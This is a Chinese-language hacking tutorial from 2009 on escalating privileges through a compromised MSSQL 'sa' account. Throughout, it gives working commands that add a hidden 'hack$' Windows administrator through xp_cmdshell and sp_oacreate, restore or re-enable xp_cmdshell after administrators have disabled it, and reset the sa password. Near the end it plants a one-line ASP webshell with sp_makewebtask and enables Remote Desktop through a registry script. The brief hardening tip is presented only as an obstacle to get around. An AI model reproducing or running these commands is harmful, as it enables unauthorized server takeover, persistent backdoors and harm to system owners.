@@ -1,0 +1,131 @@
+SQL提权常见故障解决代码
+2009-01-02 17:02
+大家知道在webshell中得到了一个SA权限的MSSQL数据库帐号和密码后,我们可以通过MSSQL提权,但是呢,由于目前国内对网络安全的重视,所以一般MSSQL中会进行一些安全的设置,包括删除一些危险的组件,由于这种情况很普遍,但是问题不集中,教程中想做到依次去演示是很困难的,下面就我收集的一些所遇到的问题的解决方法,提供给大家参考 
+在上课之前,大家必须掌握如何去使用MSSQLtools,以及MSSQL查询分离器 
+MSSQLtools:可以上传,执行一些指令,可以增加数据库帐号,以及执行一些MSSQL的数据库语句 
+SQL查询分离器,看过最初的MSSQL服务器架设的朋友,在安装目录中会自带有这个查询分离器,他这个只要是便与服务器管理员对MSSQL数据库的一些操作 
+
+SA弱口令入侵中的相关命令 
+常用SQL提权方法: 
+exec xp_cmdshell 'net user 用户名 密码 /add' 
+exec xp_cmdshell 'net localGroup Administrators 用户名 /add' 
+系统管理员帐号 
+exec master..sp_addlogin 用户名,密码 
+exec master..sp_addsrvrolemember 用户名,sysadmin 
+添加数据库帐号,sysadmin是最高权限 
+大家不管是通过扫描也好,webshell中找到的也好,一般更改MSSQL数据库帐号的指令在下面有详细指令的语句,大家可以去看一下 
+更改sa口令方法： 
+用sql综合利用工具连接后，执行命令： 
+exec sp_password NULL,'新密码','sa'(提示：慎用!) 
+---------------------------------------------------- 
+
+简单修补sa弱口令. 
+方法1:查询分离器连接后执行： 
+if exists (select * from 
+dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and 
+OBJECTPROPERTY(id, N'IsExtendedProc') = 1) 
+exec sp_dropextendedproc N'[dbo].[xp_cmdshell]' 
+
+方法2:查询分离器连接后 
+第一步执行：use master 
+第二步执行：sp_dropextendedproc 'xp_cmdshell' 然后按F5键命令执行完毕 
+-------------------------------------------------------------------- 
+同样,这上面的这些语句,可以在SQL查询分析器中进行执行 
+由于服务器管理员也知道MSSQL中SYSadmin,也就是我们常说的SA帐号的权限是非常大,他们会做出各种各样的防范的方法,下面几种是我们常可以看到的一些防范方法的破解,由于这节课是理论课,具体的实践希望大家在碰到实际情况的时间可以去参考并分析 
+下面的一些指令当显示为一行时,一定要复制成一行,如果中间断掉话,MSSQL语句是无法执行,这一点希望大家要注意 
+1.未能找到存储过程'master..xpcmdshell'. 恢复方法：查询分离器连接后, 
+第一步执行: 
+EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 
+第二步执行: 
+sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 
+然后按F5键命令执行完毕 
+恢复xp_cmdshell和spsql70.dll 
+--------------------------------------------------------------------- 
+2.无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。） 
+恢复方法：查询分离器连接后, 
+第一步执行：sp_dropextendedproc "xp_cmdshell" 
+第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'然后按F5键命令执行完毕 
+-------------------------------------------------------------------- 
+3.无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。) 
+恢复方法：查询分离器连接后, 
+第一步执行:exec sp_dropextendedproc 'xp_cmdshell' 
+第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll' 
+----------------------------------------------------------------- 
+如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户(MSSQL特定的指定添加系统管理员帐号): 
+1,查询分离器连接后, 
+2000servser系统: 
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user hack$ hack /add' 
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators hack /add' 
+xp或2003server系统: 
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user hack$ hack /add' 
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators hack$ /add' 
+或者可以 
+declare @o int 
+exec sp_oacreate 'wscript.shell', @o out 
+exec sp_oamethod @o, 'run', NULL, 'XXXXX' \\XXXXX为你要执行的命令 
+----------------------------------------------------------------- 
+
+用查询分离器连接执行以上语句的时候会出现找不到存储过程 sp_addextendedproc 
+解决方法: 
+create procedure sp_addextendedproc --- 1996/08/30 20:13 
+@functname nvarchar(517),/* (owner.)name of function to call */ 
+@dllname varchar(255)/* name of DLL containing function */ 
+as 
+set implicit_transactions off 
+if @@trancount > 0 
+begin 
+raiserror(15002,-1,-1,'sp_addextendedproc') 
+return (1) 
+end 
+dbcc addextendedproc( @functname, @dllname) 
+return (0) -- sp_addextendedproc 
+GO 
+13行的命令去突破他的这种防御 
+-------------------------------------------------- 
+SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。 
+
+解决方法: 
+;EXEC sp_configure 'show advanced options', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure 'xp_cmdshell', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure   'show advanced options', 0 -- 
+------------------------------------------------------------ 
+
+有时候在查询分析器执行一些语句时,会提示某个dll存储过程已存在,缺少什么什么组件的提问,这是由于一些安全意识较高的管理员,他删除了一些比较危险的.dll文件,遇到这种情况,我们必须先使用SQL删除这个储存的过程(可以理解:结束掉进程,再重新打开),由于他删了一些文件,我们可以自己去上传文件到对方的服务器,动画包中我也提供了一个splog70.dll的文件,所以,一开始我就告诉大家,需要将基础打好,其实这些文件如果你在虚拟机中安装过MSSQL,在安全目录中都是有 
+因为管理员是直接删除dll文件，而没删除存储过程，你这样恢复肯定是提示存储过程已存在了。 
+解决方法: 
+你要先删除存储过程， 
+use master 
+EXEC sp_dropextendedproc 'xp_cmdshell' 
+然后上传xplog70.dll到某个目录，例如C盘根目录，然后执行 
+use master dbcc addextendedproc('xp_cmdshell','c:\xplog70.dll') 
+就可以使用cmdshell存储过程执行系统指令了。 
+
+以上的情况是我们经常可以遇到的一些情况的破解方法,具体的MSSQL数据库安全方面的课程,我将会在以后的MSSQL安全防范中去教大家服务器管理员是如何去设置的 
+还有一些情况,是服务器管理员有很高的安全意识,他们建立一个USER用户组,通过登陆这个USER用户组去管理他们的MSSQL数据库,如果遇到这样的服务器,以上的方法是不可行的,因为即使是MSSQL中的sysadmin他只能继承系统中的user权限,MSSQL数据库的执行语句,由于他的特殊性,当他不是最高管理员权限时是无法进行什么的操作,只能是读取和写入和权限,这节课就到这里,虽然这是一节理论课,也希望大家将课件中的资料去好好的多看几遍~~ 
+对了忘了要用下面的这句话的时候还要首先找到存放WEB的路径！！ 
+//查看目录 
+exec master.dbo.xp_subdirs 'c:\' 
+//列出硬盘 
+exec master..xp_fixeddrives 
+这有说明自己用吧！！ 
+下面就用请出我们小马————呵呵！ 
+
+exec master.dbo.xp_subdirs 'd:\web\cdlxkj'; 
+exec sp_makewebtask 'd:\web\cdlxkj\XX.asp','select''<%execute(request("SB"))%>'' ' 
+
+
+
+
+
+     2003开3389代码 程序代码 
+echo Windows Registry Editor Version 5.00>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
+echo "fDenyTSConnections"=dword:00000000>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
+echo "PortNumber"=dword:00000d3d>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
+echo "PortNumber"=dword:00000d3d>>3389.reg 
+regedit /s 3389.reg 
+del 3389.reg       (用SQL登陆服务器后一行一行执行） 
